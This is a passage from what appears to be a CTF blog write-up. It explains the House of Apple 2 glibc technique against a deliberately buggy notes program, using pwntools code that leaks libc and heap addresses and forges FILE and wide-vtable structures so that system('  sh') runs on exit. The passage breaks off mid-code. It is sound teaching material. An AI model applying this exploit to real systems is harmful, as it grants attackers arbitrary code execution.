class=\"line\">\u003Cspan style=\"color:#F97583\">int\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> _mode;\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>glibc uses _mode to decide byte I/O vs wide-char I/O.\u003C/p>\n\u003Cp>Rule (from glibc):\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"c\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">if\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (fp\u003C/span>\u003Cspan style=\"color:#F97583\">->\u003C/span>\u003Cspan style=\"color:#E1E4E8\">_mode \u003C/span>\u003Cspan style=\"color:#F97583\">>\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">    use wide I\u003C/span>\u003Cspan style=\"color:#F97583\">/\u003C/span>\u003Cspan style=\"color:#E1E4E8\">O\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">else\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">    use byte I\u003C/span>\u003Cspan style=\"color:#F97583\">/\u003C/span>\u003Cspan style=\"color:#E1E4E8\">O\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>So when you do:\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"c\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">stderr_fp\u003C/span>\u003Cspan style=\"color:#F97583\">->\u003C/span>\u003Cspan style=\"color:#E1E4E8\">_mode \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 1\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>That guarantees _wide_data will be accessed, _wide_vtable will be dereferenced, and normal byte vtable is bypassed.\u003C/p>\n\u003Cp>\u003Cimg src=\"/images/posts/an-apple-a-day/apple-5.png\" alt=\"Mode Field\">\u003C/p>\n\u003Cp>After compiling with these flags i got an error ; we needed to do bc the FILE vtable itself is wrong, so glibc never reaches _IO_WOVERFLOW\u003C/p>\n\u003Cp>Apple 2 still needs a legitimate FILE vtable to route execution into the wide path\u003C/p>\n\u003Cp>While looking through more on house of apple i found this image , which was on the idea of exploit this chalelnge closely resembleded\u003C/p>\n\u003Cp>\u003Cimg src=\"/images/posts/an-apple-a-day/apple-6.png\" alt=\"House of Apple 2 Diagram\">\u003C/p>\n\u003Cp>In older glibc versions (&#x3C; 2.24), you could directly overwrite FILE structure vtables. But glibc added \u003Cstrong>vtable validation\u003C/strong> that checks if vtable pointers are within valid memory ranges.\u003C/p>\n\u003Cp>House of Apple 2 bypasses these protections by relying on a design gap in glibc’s FILE validation logic. Instead of forging a fake vtable, it reuses a legitimate and fully validated vtable (\u003Ccode>_IO_wfile_jumps\u003C/code>), which passes all internal consistency checks. The exploit then redirects the \u003Cstrong>wide-character vtable pointer\u003C/strong>, which glibc does not subject to the same validation as the primary vtable. When a wide-character I/O path is triggered, glibc dispatches function calls through this unvalidated wide vtable, allowing the attacker to gain control of execution without tripping the standard vtable integrity checks.\u003C/p>\n\u003Cp>When a program calls something like \u003Ccode>fwrite()\u003C/code>, glibc eventually looks up a function pointer from the FILE structure’s vtable and calls it. This means the program trusts whatever function address is stored in that table. If an attacker can control that pointer, they get to choose what code runs. That’s the core idea about apple\u003C/p>\n\u003Cp>glibc also keeps a global linked list of every open FILE stream called \u003Ccode>_IO_list_all\u003C/code>. When the program exits, glibc walks this list to flush and close all files. It starts at \u003Ccode>_IO_list_all\u003C/code>, follows each \u003Ccode>_chain\u003C/code> pointer, and calls flush-related functions on every FILE object it finds. The attack abuses this cleanup step by corrupting the list so that it points to a fake or attacker-controlled FILE structure. When glibc later flushes all streams, it unknowingly calls functions through the attacker-controlled vtable, giving code execution.\u003C/p>\n\u003Cp>This is a simple notes application with the following functions:\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"plaintext\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan>1. Create note - Allocates heap memory for a note\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>2. Delete note - Frees a note\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>3. Read note   - Displays note content\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>4. Write note  - Writes data to a note at an offset\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>5. Exit        - Exits the program\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>The vulnerability is in the \u003Cstrong>write_note\u003C/strong> function:\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"c\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">void\u003C/span>\u003Cspan style=\"color:#B392F0\"> write_note\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#F97583\">int\u003C/span>\u003Cspan style=\"color:#FFAB70\"> idx\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, \u003C/span>\u003Cspan style=\"color:#F97583\">size_t\u003C/span>\u003Cspan style=\"color:#FFAB70\"> offset\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, \u003C/span>\u003Cspan style=\"color:#F97583\">char\u003C/span>\u003Cspan style=\"color:#F97583\"> *\u003C/span>\u003Cspan style=\"color:#FFAB70\">data\u003C/span>\u003Cspan style=\"color:#E1E4E8\">) {\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\">    // BUG: offset is NOT validated!\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">    scanf\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"\u003C/span>\u003Cspan style=\"color:#79B8FF\">%s\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, \u003C/span>\u003Cspan style=\"color:#FFAB70\">notes\u003C/span>\u003Cspan style=\"color:#E1E4E8\">[idx] \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> offset);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">}\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>\u003Cstrong>What this means:\u003C/strong>\u003C/p>\n\u003Cul>\n\u003Cli>\u003Ccode>notes[idx]\u003C/code> is a pointer to our note on the heap\u003C/li>\n\u003Cli>We can specify ANY \u003Ccode>offset\u003C/code> (positive or negative!)\u003C/li>\n\u003Cli>\u003Ccode>notes[idx] + offset\u003C/code> lets us write ANYWHERE relative to our note\u003C/li>\n\u003C/ul>\n\u003Cp>\u003Cstrong>Example:\u003C/strong>\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"c\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\">// If notes[0] is at address 0x555555559000\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\">// and we use offset = -0x1000\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\">// We write to: 0x555555559000 - 0x1000 = 0x555555558000\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\">// Or if offset = 0x10000, we write to:\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\">// 0x555555559000 + 0x10000 = 0x555555569000\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>This is  an \u003Cstrong>arbitrary relative write\u003C/strong> - we can write anywhere in\r\nmemory relative to our heap\u003C/p>\n\u003Cp>So First, we need to \u003Cstrong>leak a libc address\u003C/strong>. ASLR randomizes where libc lives in memory, so until we know its base address, we can’t reliably call functions like \u003Ccode>system\u003C/code>. Once we leak one libc pointer, we can calculate where everything else in libc is.\u003C/p>\n\u003Cp>Next, we \u003Cstrong>leak a heap address\u003C/strong>. This tells us where our controlled data lives in memory. We need this because we’re going to place a fake object on the heap and later make the program treat it as something real.\u003C/p>\n\u003Cp>Then we \u003Cstrong>build a fake FILE structure on the heap\u003C/strong>. A FILE structure is just a big struct full of pointers and flags. glibc trusts it. If we carefully fill it with the right values, glibc won’t realize it’s fake.\u003C/p>\n\u003Cp>After that, we \u003Cstrong>patch critical FILE pointers\u003C/strong> like \u003Ccode>_lock\u003C/code>, \u003Ccode>_wide_data\u003C/code>, and the wide vtable pointer. These fields are needed so glibc doesn’t crash and so execution eventually flows into a function pointer we control.\u003C/p>\n\u003Cp>Next, we \u003Cstrong>overwrite \u003Ccode>_IO_list_all\u003C/code>\u003C/strong> so that instead of pointing to real FILE streams, it points to our fake FILE structure on the heap. Now glibc thinks our fake object is a real file that needs to be flushed.\u003C/p>\n\u003Cp>Finally, we \u003Cstrong>trigger \u003Ccode>exit()\u003C/code>\u003C/strong>. When the program exits, glibc automatically walks \u003Ccode>_IO_list_all\u003C/code> and flushes every FILE it sees. When it reaches our fake FILE, it follows our controlled pointers and ends up calling \u003Ccode>system(\"/bin/sh\")\u003C/code>.\u003C/p>\n\u003Cp>When we call exit ; this is somewhat of a representation of whats happening\u003C/p>\n\u003Cp>\u003Cimg src=\"/images/posts/an-apple-a-day/apple-7.png\" alt=\"Exit Flow\">\u003C/p>\n\u003Cp>glibc tries to defend against FILE-structure attacks by validating the \u003Cstrong>main vtable\u003C/strong> pointer before using it. That means if you point the main vtable to something fake or attacker-made, glibc will usually detect it and abort. House of Apple 2 avoids this by \u003Cstrong>not forging a vtable at all\u003C/strong>. Instead, it uses a real, legitimate vtable that already exists inside libc, such as \u003Ccode>_IO_wfile_jumps\u003C/code>, which passes all validation checks cleanly.\u003C/p>\n\u003Cp>The trick is that FILE structures used for wide-character I/O contain a \u003Cstrong>second vtable\u003C/strong>, called the \u003Ccode>_wide_vtable\u003C/code>. Unlike the main vtable, this wide vtable is \u003Cstrong>not validated\u003C/strong> by glibc. Once execution enters a wide-character code path, glibc blindly trusts the function pointers inside \u003Ccode>_wide_vtable\u003C/code>. By overwriting this pointer, the attacker gains control over which function gets called next.\u003C/p>\n\u003Cp>First leak a libc address because modern systems use ASLR, which means libc is loaded at a random address every time the program runs. If we do not know where libc is in memory, we cannot reliably call important functions like system. To defeat ASLR, we need to leak one real libc address and use it to calculate the rest.\u003C/p>\n\u003Cp>The program lets us read memory using a negative index, which means we can read data before the notes array. In memory, the Global Offset Table (GOT) is located nearby, and it stores the real runtime addresses of libc functions such as free. When we call read_note(-16), we accidentally read the GOT entry for free, leaking its address.\u003C/p>\n\u003Cp>Once we have the leaked address of free, we subtract its known offset inside libc. This gives us the base address of libc in memory. From that single value, we can calculate the addresses of all other libc functions, including system, which we will need later in the exploit\u003C/p>\n\u003Cp>\u003Cimg src=\"/images/posts/an-apple-a-day/apple-8.png\" alt=\"Memory Leak\">\u003C/p>\n\u003Cp>We need to create a fake \u003Ccode>_IO_FILE_plus\u003C/code> structure on the heap with three\r\nparts:\u003C/p>\n\u003Ch2 id=\"part-a-fake-_io_file-structure\">Part A: Fake \u003Ccode>_IO_FILE\u003C/code> structure\u003C/h2>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"python\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">fake_file \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> flat({\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">    0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">00\u003C/span>\u003Cspan style=\"color:#E1E4E8\">: \u003C/span>\u003Cspan style=\"color:#F97583\">b\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"  sh\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\x00\\x00\\x00\\x00\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">,    \u003C/span>\u003Cspan style=\"color:#6A737D\"># _flags\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">    0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">88\u003C/span>\u003Cspan style=\"color:#E1E4E8\">: \u003C/span>\u003Cspan style=\"color:#79B8FF\">0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">,                         \u003C/span>\u003Cspan style=\"color:#6A737D\"># _lock\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">    0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">a0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">: \u003C/span>\u003Cspan style=\"color:#79B8FF\">0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">,                         \u003C/span>\u003Cspan style=\"color:#6A737D\"># _wide_data\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">    0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">c0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">: \u003C/span>\u003Cspan style=\"color:#79B8FF\">1\u003C/span>\u003Cspan style=\"color:#E1E4E8\">,                         \u003C/span>\u003Cspan style=\"color:#6A737D\"># _mode\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">    0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">d8\u003C/span>\u003Cspan style=\"color:#E1E4E8\">: libc.sym[\u003C/span>\u003Cspan style=\"color:#9ECBFF\">'_IO_wfile_jumps'\u003C/span>\u003Cspan style=\"color:#E1E4E8\">]\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">}, \u003C/span>\u003Cspan style=\"color:#FFAB70\">length\u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#79B8FF\">224\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>This creates a \u003Cstrong>fake FILE object\u003C/strong> exactly the size glibc expects.\u003C/p>\n\u003Cul>\n\u003Cli>\n\u003Cp>\u003Cstrong>\u003Ccode>_flags = \"  sh\"\u003C/code>\u003C/strong>\r\nThis field normally stores flags, but later glibc passes it as an argument to a function pointer. Since we hijack that function to be \u003Ccode>system\u003C/code>, this becomes:\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"plaintext\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan>system(\"  sh\")\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>which spawns a shell. The spaces help avoid validation checks.\u003C/p>\n\u003C/li>\n\u003Cli>\n\u003Cp>\u003Cstrong>\u003Ccode>_lock\u003C/code>\u003C/strong>\r\nglibc expects this to point to writable memory. If it’s invalid, the program crashes. We set it to zero for now and patch it later to point into the heap.\u003C/p>\n\u003C/li>\n\u003Cli>\n\u003Cp>\u003Cstrong>\u003Ccode>_wide_data\u003C/code>\u003C/strong>\r\nThis tells glibc where the wide-character data lives. We will make this point to another fake structure we control.\u003C/p>\n\u003C/li>\n\u003Cli>\n\u003Cp>\u003Cstrong>\u003Ccode>_mode = 1\u003C/code>\u003C/strong>\r\nThis forces glibc to use \u003Cstrong>wide-character functions\u003C/strong>, which is crucial because those functions use the unvalidated wide vtable.\u003C/p>\n\u003C/li>\n\u003Cli>\n\u003Cp>\u003Cstrong>\u003Ccode>vtable = _IO_wfile_jumps\u003C/code>\u003C/strong>\r\nThis is a \u003Cstrong>real vtable inside libc\u003C/strong>. Using a legitimate vtable avoids glibc’s vtable integrity checks.\u003C/p>\n\u003C/li>\n\u003C/ul>\n\u003Cp>At this point, glibc thinks this is a completely valid FILE object.\u003C/p>\n\u003Chr>\n\u003Ch2 id=\"part-b-fake-_io_wide_data\">Part B: Fake \u003Ccode>_IO_wide_data\u003C/code>\u003C/h2>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"python\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">wide_data \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> flat({\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">    0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">18\u003C/span>\u003Cspan style=\"color:#E1E4E8\">: \u003C/span>\u003Cspan style=\"color:#79B8FF\">0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">,   \u003C/span>\u003Cspan style=\"color:#6A737D\"># _IO_write_base\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">    0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">20\u003C/span>\u003Cspan style=\"color:#E1E4E8\">: \u003C/span>\u003Cspan style=\"color:#79B8FF\">1\u003C/span>\u003Cspan style=\"color:#E1E4E8\">,   \u003C/span>\u003Cspan style=\"color:#6A737D\"># _IO_write_ptr\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">    0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">e0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">: \u003C/span>\u003Cspan style=\"color:#79B8FF\">0\u003C/span>\u003Cspan style=\"color:#6A737D\">    # _wide_vtable\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">}, \u003C/span>\u003Cspan style=\"color:#FFAB70\">length\u003C/span>\u003Cspan style=\"color:#F97583\">=0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">100\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>This structure controls \u003Cstrong>when glibc decides to flush a file\u003C/strong>.\u003C/p>\n\u003Cul>\n\u003Cli>\n\u003Cp>\u003Cstrong>\u003Ccode>_IO_write_ptr > _IO_write_base\u003C/code>\u003C/strong>\r\nSince \u003Ccode>1 > 0\u003C/code>, glibc believes there is pending data that needs to be flushed.\u003C/p>\n\u003C/li>\n\u003Cli>\n\u003Cp>When glibc flushes, it calls a function from the \u003Cstrong>wide vtable\u003C/strong>, which we control next.\u003C/p>\n\u003C/li>\n\u003Cli>\n\u003Cp>\u003Cstrong>\u003Ccode>_wide_vtable\u003C/code>\u003C/strong>\r\nThis will be patched to point to our fake wide vtable.\u003C/p>\n\u003C/li>\n\u003C/ul>\n\u003Cp>This is how we force glibc to actually make the function call.\u003C/p>\n\u003Chr>\n\u003Ch2 id=\"part-c-fake-wide-vtable\">Part C: Fake wide vtable\u003C/h2>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"python\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">wide_vtable \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> flat({\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">    0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">68\u003C/span>\u003Cspan style=\"color:#E1E4E8\">: libc.sym[\u003C/span>\u003Cspan style=\"color:#9ECBFF\">'system'\u003C/span>\u003Cspan style=\"color:#E1E4E8\">]\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">}, \u003C/span>\u003Cspan style=\"color:#FFAB70\">length\u003C/span>\u003Cspan style=\"color:#F97583\">=0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">80\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cul>\n\u003Cli>\n\u003Cp>The \u003Ccode>doallocate\u003C/code> function pointer is overwritten with \u003Ccode>system\u003C/code>.\u003C/p>\n\u003C/li>\n\u003Cli>\n\u003Cp>glibc does \u003Cstrong>not validate\u003C/strong> this wide vtable.\u003C/p>\n\u003C/li>\n\u003Cli>\n\u003Cp>When glibc calls \u003Ccode>doallocate\u003C/code>, it actually calls:\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"plaintext\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan>system(fake_file->_flags)\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003C/li>\n\u003C/ul>\n\u003Cp>And since \u003Ccode>_flags = \"  sh\"\u003C/code>, we get a shell.\u003C/p>\n\u003Chr>\n\u003Ch2 id=\"how-everything-is-laid-out-in-memory\">How everything is laid out in memory\u003C/h2>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"plaintext\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan>Offset 0x000: fake _IO_FILE      (224 bytes)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>Offset 0x100: fake _IO_wide_data (256 bytes)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>Offset 0x200: fake wide_vtable   (128 bytes)\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>And then we write it into the heap:\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"python\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">payload \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> fake_file.ljust(\u003C/span>\u003Cspan style=\"color:#F97583\">0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">100\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, \u003C/span>\u003Cspan style=\"color:#F97583\">b\u003C/span>\u003Cspan style=\"color:#9ECBFF\">'\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\x00\u003C/span>\u003Cspan style=\"color:#9ECBFF\">'\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">payload \u003C/span>\u003Cspan style=\"color:#F97583\">+=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> wide_data.ljust(\u003C/span>\u003Cspan style=\"color:#F97583\">0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">200\u003C/span>\u003Cspan style=\"color:#F97583\"> -\u003C/span>\u003Cspan style=\"color:#F97583\"> 0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">100\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, \u003C/span>\u003Cspan style=\"color:#F97583\">b\u003C/span>\u003Cspan style=\"color:#9ECBFF\">'\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\x00\u003C/span>\u003Cspan style=\"color:#9ECBFF\">'\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">payload \u003C/span>\u003Cspan style=\"color:#F97583\">+=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> wide_vtable\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">create(\u003C/span>\u003Cspan style=\"color:#79B8FF\">20000\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, payload)\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>This puts \u003Cstrong>all fake structures next to each other\u003C/strong>, so pointers inside them can reference each other safely.\u003C/p>\n\u003Ch4 id=\"leaking-the-heap-address\">Leaking the heap address\u003C/h4>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"python\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">heap_addr \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> u64(read_note(\u003C/span>\u003Cspan style=\"color:#79B8FF\">0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">).ljust(\u003C/span>\u003Cspan style=\"color:#79B8FF\">8\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, \u003C/span>\u003Cspan style=\"color:#F97583\">b\u003C/span>\u003Cspan style=\"color:#9ECBFF\">'\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\x00\u003C/span>\u003Cspan style=\"color:#9ECBFF\">'\u003C/span>\u003Cspan style=\"color:#E1E4E8\">))\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>At this point, we already created a note that lives on the heap. When we read that note back, the program does not just give us our clean payload. It also leaks \u003Cstrong>heap metadata\u003C/strong> that glibc stores next to heap chunks. This metadata contains pointers that point back into the heap itself.\u003C/p>\n\u003Cp>By reading the first few bytes of the note and converting them into a 64-bit value, we recover a \u003Cstrong>real heap address\u003C/strong>.\u003C/p>\n\u003Ch4 id=\"patching-the-fake-file-pointers\">Patching the fake FILE pointers\u003C/h4>\n\u003Cp>Now that we know the heap base address, we can \u003Cstrong>fix up the fake FILE structure\u003C/strong> so all its internal pointers point to valid memory.\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"python\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">write_note(\u003C/span>\u003Cspan style=\"color:#79B8FF\">0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, \u003C/span>\u003Cspan style=\"color:#F97583\">0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">88\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, p64(heap_addr \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#F97583\"> 0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">10\u003C/span>\u003Cspan style=\"color:#E1E4E8\">))   \u003C/span>\u003Cspan style=\"color:#6A737D\"># _lock\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>The \u003Ccode>_lock\u003C/code> field must point to writable memory or glibc will crash when it tries to lock the FILE. We point it slightly inside the heap, which is always writable.\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"python\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">write_note(\u003C/span>\u003Cspan style=\"color:#79B8FF\">0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, \u003C/span>\u003Cspan style=\"color:#F97583\">0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">a0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, p64(heap_addr \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#F97583\"> 0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">100\u003C/span>\u003Cspan style=\"color:#E1E4E8\">))  \u003C/span>\u003Cspan style=\"color:#6A737D\"># _wide_data\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>This tells glibc where the wide-character data lives. We already placed our fake \u003Ccode>_IO_wide_data\u003C/code> structure at offset \u003Ccode>0x100\u003C/code> inside the payload, so we point \u003Ccode>_wide_data\u003C/code> there.\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"python\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">write_note(\u003C/span>\u003Cspan style=\"color:#79B8FF\">0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, \u003C/span>\u003Cspan style=\"color:#F97583\">0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">1e0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, p64(heap_addr \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#F97583\"> 0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">200\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)) \u003C/span>\u003Cspan style=\"color:#6A737D\"># 